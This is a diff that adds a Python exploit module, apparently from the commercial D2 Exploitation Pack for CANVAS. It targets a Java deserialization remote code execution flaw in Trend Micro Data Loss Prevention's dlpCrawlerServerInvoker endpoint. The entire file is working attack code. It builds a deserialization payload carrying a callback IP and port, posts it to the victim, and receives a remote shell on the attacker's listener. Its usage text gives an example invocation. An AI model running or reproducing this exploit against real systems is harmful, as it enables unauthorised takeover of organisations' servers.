@@ -1,0 +1,164 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+import sys
+import logging
+import os
+import base64
+import struct
+import re
+
+from urllib import quote
+from time import sleep
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+import canvasengine
+import urllib
+import random
+import libs.spkproxy as spkproxy
+from libs.apache_commons_deserialize import objectcreator
+
+from exploitutils import *
+from tcpexploit import *
+from canvasexploit import *
+
+# GUI info
+NAME = "Trend Micro Data Loss Prevention dlpCrawlerServerInvoker Deserialization Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in Trend Micro Data Loss Protection dlpCrawlerServerInvoker java object deserialization"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Trend Micro"
+DOCUMENTATION["Date public"] = "2017.04.13"
+DOCUMENTATION["VersionsAffected"] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Steven%20Seeley%20and%20Roberto%20Suggi%20Liverani%20-%20I%20Got%2099%20Trends%20and%20a%20%23%20Is%20All%20Of%20Them.pdf"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.port = 8080
+        self.host = ""
+        self.version = 0
+        self.ssl = ""
+        self.name = NAME
+        self.basepath = "/dsc/invoker/dlpCrawlerServerInvoker"
+        self.remote_mosdef_path = "/tmp/%s" % str(random.randint(0, 3000))
+        self.mosdef_type = "UNIVERSAL"
+        self.http_ssl = False
+        self.hostname = None
+        self.targetpath = ""        
+        return
+    
+    
+    def neededListenerTypes(self):
+        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()        
+        if mosdef_type == "HTTP":
+            if self.http_ssl:
+                return [canvasengine.HTTPMOSDEF_SSL]
+            else:
+                return [canvasengine.HTTPMOSDEF]
+        else:
+            return [canvasengine.UNIVERSAL_MOSDEF]
+
+
+    def needs_mosdef_http(self):
+        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
+        return mosdef_type == "HTTP"
+
+
+    def needs_mosdef_ssl(self):
+        return self.http_ssl
+
+
+    def getargs(self):
+        self.mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
+        self.host=self.target.interface
+        self.port=int(self.argsDict.get("port",self.port))
+        self.basepath=self.argsDict.get("basepath",self.basepath)
+        self.ssl=self.argsDict.get("ssl",self.ssl)
+        return
+
+
+    def send_request(self, payload=None):
+        if not self.hostname:
+            self.hostname = self.host
+            
+        self.log("Attacking %s:%d" % (self.hostname, self.port))
+        self.log("VHost: %s" % self.hostname)
+        
+        if self.ssl:
+            protocol = "https"
+        else:
+            protocol = "http"
+        
+        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
+        self.ua = spkproxy.UserAgent(targetstring, hostname=self.hostname, exploit=self)
+
+        host_field = "%s:%s" % (self.hostname, self.port)        
+        self.ua.addHeader("Host", host_field)
+ 
+        data = None
+        data = self.ua.POST(self.targetpath, payload, extraheaders=None, noresponse=True)
+
+        return data
+            
+            
+    def run(self):
+        self.getargs()
+        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))
+        
+        payload = objectcreator(callback_ip=self.callback.ip,
+                                    callback_port=self.callback.port,
+                                    use_http=self.needs_mosdef_http(),
+                                    use_ssl=self.needs_mosdef_ssl()).get_payload()            
+        
+        self.send_request(payload)                      
+        
+        self.setInfo("%s attacking %s:%d (DONE)" % (self.name, self.host, self.port))            
+
+        return 1
+
+
+    def usage(self):
+        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
+        logging.info("-t <target ip>")
+        logging.info("-p <target port>                 [optional]")
+        logging.info("-O basepath: /path/to/target/    [optional]")
+        logging.info("-O hostname: target vhost        [optional]")
+        logging.info("-l call back ip for standard callback")
+        logging.info("-d listening port for callback")
+        return
+
+
+if __name__ == '__main__':
+    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
+    app = theexploit()
+    ret = standard_callback_commandline(app)
